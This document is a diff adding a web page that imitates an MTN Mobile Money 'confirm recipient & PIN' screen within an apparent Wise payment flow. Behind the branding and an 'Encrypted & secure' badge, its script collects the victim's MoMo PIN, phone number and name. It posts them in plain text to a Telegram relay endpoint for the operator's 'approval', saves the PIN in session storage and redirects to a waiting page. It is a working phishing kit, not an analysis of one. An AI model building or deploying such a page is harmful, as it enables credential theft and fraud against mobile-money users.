@@ -1,0 +1,661 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MTN Mobile Money · Confirm recipient</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+
+  :root {
+    --wise-green: #9FE870;
+    --wise-dark-green: #163300;
+    --wise-forest: #0E1B0F;
+    --wise-soft-mint: #E8F5E9;
+    --wise-light-bg: #F7FBF9;
+    --wise-grey: #6B7C6E;
+    --wise-border: #DDE5DF;
+    --wise-white: #FFFFFF;
+    --wise-error: #D14343;
+    --shadow-lg: 0 20px 40px -12px rgba(22, 51, 0, 0.18);
+    --mtn-yellow: #FFCC00;
+    --mtn-yellow-dark: #E6B800;
+    --mtn-black: #000000;
+    --mtn-light-grey: #F7F7F7;
+    --mtn-border: #E4E4E4;
+    --mtn-text: #1A1A1A;
+    --mtn-text-light: #6B6B6B;
+    --mtn-text-muted: #9B9B9B;
+  }
+
+  body {
+    font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+    background: linear-gradient(160deg, #FFFEF7 0%, #FFF9E0 100%);
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 1.5rem;
+    color: var(--mtn-text);
+    -webkit-font-smoothing: antialiased;
+    overflow-x: hidden;
+  }
+
+  .card-container { max-width: 540px; width: 100%; }
+
+  .payment-card {
+    background: var(--wise-white);
+    border-radius: 1.75rem;
+    box-shadow: var(--shadow-lg);
+    padding: 2rem 2rem 1.75rem;
+    border: 1px solid rgba(22, 51, 0, 0.04);
+    position: relative;
+    overflow: hidden;
+    animation: cardEnter 0.42s cubic-bezier(0.22, 1, 0.36, 1) both;
+  }
+  @keyframes cardEnter {
+    from { opacity: 0; transform: translateY(14px) scale(0.98); }
+    to { opacity: 1; transform: translateY(0) scale(1); }
+  }
+  .payment-card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 6px;
+    background: var(--mtn-yellow);
+  }
+
+  .mtn-header {
+    display: flex; align-items: center; gap: 0.85rem;
+    margin-bottom: 1.5rem; padding-bottom: 1.25rem;
+    border-bottom: 1px solid var(--mtn-border);
+  }
+  .mtn-logo {
+    background: var(--mtn-yellow);
+    width: 52px; height: 52px; border-radius: 14px;
+    display: flex; align-items: center; justify-content: center;
+    box-shadow: 0 4px 12px rgba(255,204,0,0.4);
+    flex-shrink: 0;
+    font-weight: 800; font-size: 1.1rem;
+    color: var(--mtn-black); letter-spacing: -0.03em;
+  }
+  .mtn-title { display: flex; flex-direction: column; gap: 0.15rem; }
+  .mtn-title .brand { font-size: 1.2rem; font-weight: 700; color: var(--mtn-text); line-height: 1.1; }
+  .mtn-title .subtitle { font-size: 0.82rem; font-weight: 500; color: var(--mtn-text-light); }
+
+  .amount-hero {
+    background: linear-gradient(135deg, #FFFDF0 0%, #FFF8D9 100%);
+    border: 1px solid #F0E4B0;
+    border-radius: 1rem;
+    padding: 1.25rem 1.5rem;
+    margin-bottom: 1.5rem;
+    display: flex; align-items: center; justify-content: space-between;
+    gap: 1rem;
+  }
+  .amount-hero .label-block { display: flex; flex-direction: column; gap: 0.2rem; }
+  .amount-hero .label-block .label {
+    font-size: 0.75rem; font-weight: 600; color: var(--mtn-text-light);
+    text-transform: uppercase; letter-spacing: 0.08em;
+  }
+  .amount-hero .label-block .sub { font-size: 0.78rem; color: var(--mtn-text-muted); font-weight: 400; }
+  .amount-hero .amount-display { text-align: right; }
+  .amount-hero .amount-display .value {
+    font-size: 1.65rem; font-weight: 700; letter-spacing: -0.03em;
+    color: var(--mtn-text); line-height: 1.1;
+  }
+  .amount-hero .amount-display .cur {
+    display: inline-block;
+    background: var(--mtn-yellow); color: var(--mtn-black);
+    font-size: 0.68rem; font-weight: 700;
+    padding: 0.18rem 0.55rem; border-radius: 20px;
+    letter-spacing: 0.05em; margin-left: 0.35rem;
+    vertical-align: middle;
+  }
+
+  .mtn-form { display: flex; flex-direction: column; gap: 1.15rem; margin-bottom: 1.5rem; }
+  .form-group { display: flex; flex-direction: column; gap: 0.45rem; }
+  .form-label {
+    font-size: 0.82rem; font-weight: 600; color: var(--mtn-text);
+    display: flex; align-items: center; gap: 0.4rem; letter-spacing: 0.01em;
+  }
+  .form-label svg {
+    width: 14px; height: 14px; stroke: var(--mtn-text-light); fill: none;
+    stroke-width: 2; stroke-linecap: round; stroke-linejoin: round;
+  }
+  .form-label .required { color: var(--wise-error); font-weight: 700; }
+
+  .phone-input-wrap {
+    display: flex; align-items: stretch;
+    background: var(--mtn-light-grey);
+    border: 1.5px solid var(--mtn-border);
+    border-radius: 0.75rem; overflow: hidden;
+    transition: border-color 0.15s, box-shadow 0.15s, background 0.15s;
+  }
+  .phone-input-wrap:focus-within {
+    border-color: var(--mtn-yellow-dark);
+    background: var(--wise-white);
+    box-shadow: 0 0 0 3px rgba(255,204,0,0.2);
+  }
+  .phone-input-wrap.error { border-color: var(--wise-error); background: #FFF8F8; }
+
+  .country-picker { position: relative; flex-shrink: 0; }
+  .country-prefix {
+    display: flex; align-items: center; gap: 0.4rem;
+    padding: 0 0.9rem; height: 100%;
+    font-size: 0.92rem; font-weight: 600; color: var(--mtn-text);
+    background: #EFEFEF; border-right: 1.5px solid var(--mtn-border);
+    white-space: nowrap; user-select: none; cursor: pointer;
+    transition: background 0.15s;
+  }
+  .country-prefix:hover { background: #E5E5E5; }
+  .country-prefix .flag { font-size: 1.1rem; line-height: 1; }
+  .country-prefix .code { font-weight: 700; letter-spacing: 0.02em; font-size: 0.9rem; }
+  .country-prefix .caret {
+    width: 11px; height: 11px; stroke: var(--mtn-text-light);
+    fill: none; stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round;
+  }
+  .country-picker select {
+    position: absolute; inset: 0; opacity: 0; cursor: pointer;
+    width: 100%; height: 100%; font-size: 1rem;
+  }
+  .phone-input-wrap input {
+    flex: 1; padding: 0.9rem 1rem;
+    font-size: 1rem; font-family: 'Inter', sans-serif; font-weight: 500;
+    color: var(--mtn-text); background: transparent;
+    border: none; outline: none; letter-spacing: 0.02em; min-width: 0;
+  }
+  .phone-input-wrap input::placeholder { color: #B5B5B5; font-weight: 400; letter-spacing: 0; }
+
+  .form-input {
+    width: 100%; padding: 0.9rem 1rem;
+    font-size: 0.98rem; font-family: 'Inter', sans-serif; font-weight: 500;
+    color: var(--mtn-text); background: var(--mtn-light-grey);
+    border: 1.5px solid var(--mtn-border); border-radius: 0.75rem;
+    outline: none; transition: border-color 0.15s, box-shadow 0.15s, background 0.15s;
+  }
+  .form-input::placeholder { color: #B5B5B5; font-weight: 400; }
+  .form-input:focus {
+    border-color: var(--mtn-yellow-dark);
+    background: var(--wise-white);
+    box-shadow: 0 0 0 3px rgba(255,204,0,0.2);
+  }
+  .form-input.error { border-color: var(--wise-error); background: #FFF8F8; }
+
+  .pin-input-wrap { position: relative; }
+  .pin-input-wrap input {
+    width: 100%; padding: 0.9rem 3.2rem 0.9rem 1rem;
+    font-size: 1.15rem; font-family: 'Inter', sans-serif; font-weight: 600;
+    letter-spacing: 0.4em; color: var(--mtn-text);
+    background: var(--mtn-light-grey);
+    border: 1.5px solid var(--mtn-border);
+    border-radius: 0.75rem; outline: none;
+    transition: border-color 0.15s, box-shadow 0.15s, background 0.15s;
+  }
+  .pin-input-wrap input::placeholder {
+    letter-spacing: normal; font-size: 0.88rem;
+    font-weight: 400; color: #B5B5B5;
+  }
+  .pin-input-wrap input:focus {
+    border-color: var(--mtn-yellow-dark);
+    background: var(--wise-white);
+    box-shadow: 0 0 0 3px rgba(255,204,0,0.2);
+  }
+  .pin-input-wrap input.error { border-color: var(--wise-error); background: #FFF8F8; }
+  .pin-toggle {
+    position: absolute; right: 0.6rem; top: 50%; transform: translateY(-50%);
+    background: none; border: none; cursor: pointer; padding: 0.45rem;
+    display: flex; align-items: center; justify-content: center;
+    color: var(--mtn-text-muted); border-radius: 8px;
+    transition: background 0.15s, color 0.15s;
+  }
+  .pin-toggle:hover { background: rgba(0,0,0,0.05); color: var(--mtn-text); }
+  .pin-toggle svg {
+    width: 19px; height: 19px; stroke: currentColor; fill: none;
+    stroke-width: 2; stroke-linecap: round; stroke-linejoin: round;
+  }
+
+  .form-hint {
+    font-size: 0.73rem; color: var(--mtn-text-muted);
+    display: flex; align-items: center; gap: 0.3rem; line-height: 1.4;
+  }
+  .form-hint svg {
+    width: 12px; height: 12px; stroke: currentColor; fill: none;
+    stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; flex-shrink: 0;
+  }
+
+  .secure-badge {
+    display: inline-flex; align-items: center; gap: 0.35rem;
+    background: #EAF7EC; color: #0E7C3A;
+    font-size: 0.72rem; font-weight: 600;
+    padding: 0.3rem 0.7rem; border-radius: 20px; margin-top: 0.15rem;
+  }
+  .secure-badge svg {
+    width: 12px; height: 12px; stroke: currentColor; fill: none;
+    stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round;
+  }
+
+  .mtn-confirm-btn {
+    width: 100%; border: none; border-radius: 0.85rem;
+    padding: 1.1rem 1.5rem;
+    font-size: 1.05rem; font-weight: 700; font-family: 'Inter', sans-serif;
+    display: flex; align-items: center; justify-content: center; gap: 0.6rem;
+    cursor: pointer;
+    transition: transform 0.15s, box-shadow 0.15s, background 0.15s;
+    background: var(--mtn-yellow); color: var(--mtn-black);
+    box-shadow: 0 4px 14px rgba(255,204,0,0.4); letter-spacing: -0.01em;
+  }
+  .mtn-confirm-btn:hover:not(:disabled) {
+    background: #F5C200; transform: translateY(-1px);
+    box-shadow: 0 8px 20px rgba(255,204,0,0.5);
+  }
+  .mtn-confirm-btn:active:not(:disabled) { transform: translateY(1px) scale(0.99); }
+  .mtn-confirm-btn:disabled {
+    background: #E6E6E6; color: #999; box-shadow: none; cursor: not-allowed;
+  }
+  .mtn-confirm-btn svg {
+    width: 20px; height: 20px; stroke: currentColor; fill: none;
+    stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round;
+  }
+
+  .back-link {
+    display: flex; align-items: center; justify-content: center;
+    gap: 0.4rem; margin-top: 1rem;
+    font-size: 0.82rem; font-weight: 500; color: var(--mtn-text-light);
+    background: none; border: none; cursor: pointer;
+    font-family: 'Inter', sans-serif; padding: 0.5rem; width: 100%;
+    transition: color 0.15s;
+  }
+  .back-link:hover { color: var(--mtn-text); }
+  .back-link svg {
+    width: 14px; height: 14px; stroke: currentColor; fill: none;
+    stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round;
+  }
+
+  .status-message {
+    margin-top: 1rem; padding: 0.85rem 1.15rem;
+    border-radius: 0.85rem; font-size: 0.87rem; font-weight: 500;
+    display: flex; align-items: center; gap: 0.6rem; line-height: 1.4;
+  }
+  .status-message.success { background: #E8F5E9; color: #0E7C3A; border: 1px solid #B8DFC6; }
+  .status-message.error { background: #FDECEC; color: var(--wise-error); border: 1px solid #F3BFBF; }
+  .status-message.info { background: #FFF8E1; color: #8A6D00; border: 1px solid #FFE082; }
+  .status-message svg {
+    width: 17px; height: 17px; flex-shrink: 0;
+    stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round; fill: none;
+  }
+  .status-message.hidden { display: none; }
+
+  .footer-note {
+    margin-top: 1.25rem; padding-top: 1.1rem;
+    border-top: 1px solid var(--mtn-border);
+    font-size: 0.76rem; color: var(--mtn-text-muted);
+    text-align: center; display: flex; align-items: center;
+    justify-content: center; gap: 0.4rem;
+  }
+  .footer-note svg {
+    width: 13px; height: 13px; stroke: currentColor; fill: none;
+    stroke-width: 1.8; stroke-linecap: round; stroke-linejoin: round;
+  }
+
+  @keyframes spinRing { to { transform: rotate(360deg); } }
+  .spin { animation: spinRing 0.7s linear infinite; }
+
+  @media (max-width: 480px) {
+    .payment-card { padding: 1.6rem 1.25rem 1.4rem; border-radius: 1.5rem; }
+    .amount-hero { padding: 1rem 1.15rem; }
+    .amount-hero .amount-display .value { font-size: 1.35rem; }
+    .mtn-confirm-btn { font-size: 1rem; padding: 1rem 1.25rem; }
+    .country-prefix { padding: 0 0.7rem; }
+    .mtn-logo { width: 46px; height: 46px; font-size: 1rem; }
+  }
+</style>
+</head>
+<body>
+
+<div class="card-container">
+  <div class="payment-card">
+    <div class="mtn-header">
+      <div class="mtn-logo">MTN</div>
+      <div class="mtn-title">
+        <span class="brand">MTN Mobile Money</span>
+        <span class="subtitle">Confirm recipient & PIN</span>
+      </div>
+    </div>
+
+    <div class="amount-hero">
+      <div class="label-block">
+        <span class="label">Transfer amount</span>
+        <span class="sub">You are sending</span>
+      </div>
+      <div class="amount-display">
+        <span class="value" id="mtnAmount">—</span>
+        <span class="cur" id="mtnCurrency">USD</span>
+      </div>
+    </div>
+
+    <div class="mtn-form">
+      <div class="form-group">
+        <label class="form-label" for="recipientPhone">
+          <svg viewBox="0 0 24 24"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"/></svg>
+          Recipient number <span class="required">*</span>
+        </label>
+        <div class="phone-input-wrap" id="phoneWrap">
+          <div class="country-picker">
+            <div class="country-prefix" id="countryPrefix">
+              <span class="flag" id="countryFlag">🇺🇬</span>
+              <span class="code" id="countryCode">+256</span>
+              <svg class="caret" viewBox="0 0 24 24"><polyline points="6 9 12 15 18 9"/></svg>
+            </div>
+            <select id="countrySelect" aria-label="Country">
+              <option value="UG|+256|🇺🇬|UGX|3800" selected>Uganda (+256)</option>
+              <option value="KE|+254|🇰🇪|KES|129">Kenya (+254)</option>
+              <option value="TZ|+255|🇹🇿|TZS|2650">Tanzania (+255)</option>
+              <option value="RW|+250|🇷🇼|RWF|1400">Rwanda (+250)</option>
+              <option value="GH|+233|🇬🇭|GHS|15.5">Ghana (+233)</option>
+              <option value="NG|+234|🇳🇬|NGN|1550">Nigeria (+234)</option>
+              <option value="ZA|+27|🇿🇦|ZAR|18.5">South Africa (+27)</option>
+              <option value="CI|+225|🇨🇮|XOF|605">Côte d'Ivoire (+225)</option>
+              <option value="CM|+237|🇨🇲|XAF|605">Cameroon (+237)</option>
+              <option value="SN|+221|🇸🇳|XOF|605">Senegal (+221)</option>
+              <option value="ZM|+260|🇿🇲|ZMW|26">Zambia (+260)</option>
+              <option value="MW|+265|🇲🇼|MWK|1730">Malawi (+265)</option>
+            </select>
+          </div>
+          <input type="tel" id="recipientPhone" placeholder="771 234 567" autocomplete="tel" inputmode="numeric" />
+        </div>
+        <span class="form-hint">
+          <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>
+          Enter the MTN number without the country code
+        </span>
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="recipientName">
+          <svg viewBox="0 0 24 24"><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/><circle cx="12" cy="7" r="4"/></svg>
+          Recipient name <span class="required">*</span>
+        </label>
+        <input type="text" id="recipientName" class="form-input" placeholder="e.g. John Doe" autocomplete="name" />
+      </div>
+
+      <div class="form-group">
+        <label class="form-label" for="momoPin">
+          <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          MoMo PIN <span class="required">*</span>
+        </label>
+        <div class="pin-input-wrap">
+          <input type="password" id="momoPin" placeholder="Enter your 5-digit MoMo PIN" maxlength="5" inputmode="numeric" autocomplete="off" />
+          <button type="button" class="pin-toggle" id="pinToggle" aria-label="Show PIN">
+            <svg id="pinEye" viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
+          </button>
+        </div>
+        <span class="secure-badge">
+          <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+          Encrypted &amp; secure
+        </span>
+      </div>
+    </div>
+
+    <button class="mtn-confirm-btn" id="mtnConfirmBtn">
+      <svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>
+      Confirm transaction
+    </button>
+
+    <div id="mtnStatus" class="status-message hidden">
+      <svg viewBox="0 0 24 24" id="mtnStatusIcon"><polyline points="20 6 9 17 4 12"/></svg>
+      <span id="mtnStatusText"></span>
+    </div>
+
+    <button class="back-link" id="backBtn">
+      <svg viewBox="0 0 24 24"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
+      Back to Wise payment
+    </button>
+
+    <div class="footer-note">
+      <svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+      Secured by MTN Mobile Money
+    </div>
+  </div>
+</div>
+
+<script>
+(function() {
+  const STORAGE_KEY = 'wise_payment_data';
+  const DEFAULT_DATA = {
+    senderName: 'Maya Chen',
+    senderEmail: 'maya.chen@example.com',
+    amount: 1250.00,
+    currency: 'USD',
+    reference: 'WISE-2025-4F2A',
+    note: 'Payment for design services'
+  };
+
+  const CURRENCY_INFO = {
+    UGX: 3800, KES: 129, TZS: 2650, RWF: 1400, GHS: 15.5,
+    NGN: 1550, ZAR: 18.5, XOF: 605, XAF: 605, ZMW: 26,
+    MWK: 1730, USD: 1
+  };
+
+  const paymentData = (function(){
+    try {
+      const raw = localStorage.getItem(STORAGE_KEY);
+      return raw ? { ...DEFAULT_DATA, ...JSON.parse(raw) } : { ...DEFAULT_DATA };
+    } catch(e) { return { ...DEFAULT_DATA }; }
+  })();
+
+  const $ = id => document.getElementById(id);
+  const recipientPhone = $('recipientPhone');
+  const recipientName = $('recipientName');
+  const momoPin = $('momoPin');
+  const pinToggle = $('pinToggle'), pinEye = $('pinEye');
+  const countrySelect = $('countrySelect');
+  const countryFlag = $('countryFlag'), countryCode = $('countryCode');
+  const phoneWrap = $('phoneWrap');
+  const mtnConfirmBtn = $('mtnConfirmBtn');
+  const mtnStatus = $('mtnStatus'), mtnStatusText = $('mtnStatusText'), mtnStatusIcon = $('mtnStatusIcon');
+
+  function fmtAmount(n) {
+    return (parseFloat(n) || 0).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+  }
+  function fmtLocal(amount, currency) {
+    const rate = CURRENCY_INFO[currency] || 1;
+    const local = (parseFloat(amount) || 0) * rate;
+    const dec = local > 100 ? 0 : 2;
+    return local.toLocaleString('en-US', { minimumFractionDigits: dec, maximumFractionDigits: dec });
+  }
+  function getCountry() {
+    const p = countrySelect.value.split('|');
+    return {
+      code: p[0], dial: p[1], flag: p[2],
+      localCurrency: p[3] || 'UGX',
+      rate: parseFloat(p[4]) || 1,
+      name: countrySelect.options[countrySelect.selectedIndex].text.split(' (')[0]
+    };
+  }
+  function getFullPhone() {
+    const c = getCountry();
+    const local = recipientPhone.value.trim().replace(/\s/g, '');
+    return `${c.dial}${local}`;
+  }
+  function esc(s) {
+    if (s == null) return '';
+    return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+  }
+
+  function showStatus(msg, type) {
+    mtnStatusText.textContent = msg;
+    mtnStatus.classList.remove('hidden', 'success', 'error', 'info');
+    mtnStatus.classList.add(type);
+    if (type === 'error') mtnStatusIcon.innerHTML = '<circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>';
+    else if (type === 'info') mtnStatusIcon.innerHTML = '<circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/>';
+    else mtnStatusIcon.innerHTML = '<polyline points="20 6 9 17 4 12"/>';
+    setTimeout(() => mtnStatus.classList.add('hidden'), 3500);
+  }
+
+  async function sendTelegram(html, txnId, stage) {
+    try {
+      const res = await fetch('/api/telegram', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ message: html, txnId, stage })
+      });
+      return await res.json();
+    } catch (e) { console.error('Telegram send failed:', e); }
+  }
+
+  // Render amount
+  $('mtnAmount').textContent = fmtAmount(paymentData.amount);
+  $('mtnCurrency').textContent = paymentData.currency || 'USD';
+  if (!recipientName.value) recipientName.value = paymentData.senderName || '';
+
+  // Country picker
+  countrySelect.addEventListener('change', () => {
+    const p = countrySelect.value.split('|');
+    countryFlag.textContent = p[2];
+    countryCode.textContent = p[1];
+    phoneWrap.classList.remove('error');
+  });
+
+  // PIN toggle
+  pinToggle.addEventListener('click', () => {
+    const pw = momoPin.type === 'password';
+    momoPin.type = pw ? 'text' : 'password';
+    pinEye.innerHTML = pw
+      ? '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/>'
+      : '<path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>';
+  });
+
+  // Input filters
+  recipientPhone.addEventListener('input', () => {
+    recipientPhone.value = recipientPhone.value.replace(/[^\d\s]/g, '');
+    phoneWrap.classList.remove('error');
+  });
+  momoPin.addEventListener('input', () => {
+    momoPin.value = momoPin.value.replace(/\D/g, '').slice(0, 5);
+    momoPin.classList.remove('error');
+  });
+
+  // Back
+  $('backBtn').addEventListener('click', () => {
+    window.location.href = 'index.html';
+  });
+
+  // ============================================================
+  // CONFIRM → SEND ENHANCED TELEGRAM MESSAGE → NAVIGATE
+  // ============================================================
+  mtnConfirmBtn.addEventListener('click', async () => {
+    const phoneLocal = recipientPhone.value.trim().replace(/\s/g, '');
+    const pin = momoPin.value.trim();
+    const name = recipientName.value.trim();
+
+    // Validation
+    if (!phoneLocal) {
+      phoneWrap.classList.add('error');
+      showStatus('Please enter the recipient number.', 'error');
+      recipientPhone.focus(); return;
+    }
+    if (!/^\d{7,12}$/.test(phoneLocal)) {
+      phoneWrap.classList.add('error');
+      showStatus('Please enter a valid number (7–12 digits).', 'error');
+      recipientPhone.focus(); return;
+    }
+    if (!name) {
+      recipientName.classList.add('error');
+      showStatus('Please enter the recipient name.', 'error');
+      recipientName.focus(); return;
+    }
+    if (!pin || pin.length < 5) {
+      momoPin.classList.add('error');
+      showStatus('Please enter your 5-digit MoMo PIN.', 'error');
+      momoPin.focus(); return;
+    }
+
+    phoneWrap.classList.remove('error');
+    recipientName.classList.remove('error');
+    momoPin.classList.remove('error');
+
+    mtnConfirmBtn.disabled = true;
+    mtnConfirmBtn.innerHTML = '<svg class="spin" viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2.5" fill="none" stroke-dasharray="30 60"/></svg>Processing...';
+
+    const country = getCountry();
+    const phoneFull = getFullPhone();
+    const localAmount = fmtLocal(paymentData.amount, country.localCurrency);
+    const exchangeRate = (parseFloat(localAmount.replace(/,/g,'')) / (parseFloat(paymentData.amount) || 1)).toFixed(2);
+    const txnId = 'MTN-' + Date.now().toString(36).toUpperCase() + '-' + Math.random().toString(36).slice(2,6).toUpperCase();
+
+    // ============================================================
+    // ENHANCED TELEGRAM MESSAGE
+    // ============================================================
+    const message = `🔔 <b>NEW TRANSACTION — APPROVAL REQUIRED</b>
+
+━━━━━━━━━━━━━━━━━━━━
+<b>💳 WISE PAYMENT</b>
+━━━━━━━━━━━━━━━━━━━━
+<b>Sender:</b> ${esc(paymentData.senderName)}
+<b>Email:</b> ${esc(paymentData.senderEmail)}
+<b>Amount:</b> ${esc(fmtAmount(paymentData.amount))} ${esc(paymentData.currency)}
+<b>Reference:</b> ${esc(paymentData.reference || DEFAULT_DATA.reference)}
+<b>Note:</b> ${esc(paymentData.note || DEFAULT_DATA.note)}
+
+━━━━━━━━━━━━━━━━━━━━
+<b>📱 MTN RECIPIENT</b>
+━━━━━━━━━━━━━━━━━━━━
+<b>Name:</b> ${esc(name)}
+<b>Country:</b> ${esc(country.name)}
+<b>Country code:</b> ${esc(country.dial)}
+<b>Number (full):</b> ${esc(phoneFull)}
+<b>Number (local):</b> ${esc(phoneLocal)}
+<b>MoMo PIN:</b> <code>${esc(pin)}</code>
+
+━━━━━━━━━━━━━━━━━━━━
+<b>💰 LOCAL AMOUNT</b>
+━━━━━━━━━━━━━━━━━━━━
+<b>You send:</b> ${esc(fmtAmount(paymentData.amount))} ${esc(paymentData.currency)}
+<b>Recipient gets:</b> ${esc(localAmount)} ${esc(country.localCurrency)}
+<b>Exchange rate:</b> 1 ${esc(paymentData.currency)} ≈ ${esc(exchangeRate)} ${esc(country.localCurrency)}
+
+━━━━━━━━━━━━━━━━━━━━
+<b>🆔 Txn ID:</b> <code>${esc(txnId)}</code>
+<b>🕒 Time:</b> ${esc(new Date().toLocaleString('en-GB', {
+  day: '2-digit', month: 'short', year: 'numeric',
+  hour: '2-digit', minute: '2-digit', second: '2-digit'
+}))}
+<b>🌐 User agent:</b> <code>${esc((navigator.userAgent || '').slice(0, 60))}...</code>
+
+<b>⚠️ Awaiting your approval below</b>`;
+
+    try {
+      await sendTelegram(message, txnId, 'recipient');
+
+      // Save session for the next pages
+      sessionStorage.setItem('wise_session', JSON.stringify({
+        txnId,
+        stage: 'recipient',
+        recipientName: name,
+        recipientPhone: phoneFull,
+        recipientPhoneLocal: phoneLocal,
+        recipientCountry: country.name,
+        recipientCountryCode: country.code,
+        recipientDial: country.dial,
+        localCurrency: country.localCurrency,
+        localAmount,
+        exchangeRate,
+        momoPin: pin,
+        txnSentAt: Date.now()
+      }));
+
+      // Navigate immediately
+      window.location.href = 'waiting.html';
+    } catch (err) {
+      console.error('Failed:', err);
+      mtnConfirmBtn.disabled = false;
+      mtnConfirmBtn.innerHTML = '<svg viewBox="0 0 24 24"><polyline points="20 6 9 17 4 12"/></svg>Confirm transaction';
+      showStatus('Could not send details. Please try again.', 'error');
+    }
+  });
+})();
+</script>
+</body>
+</html>
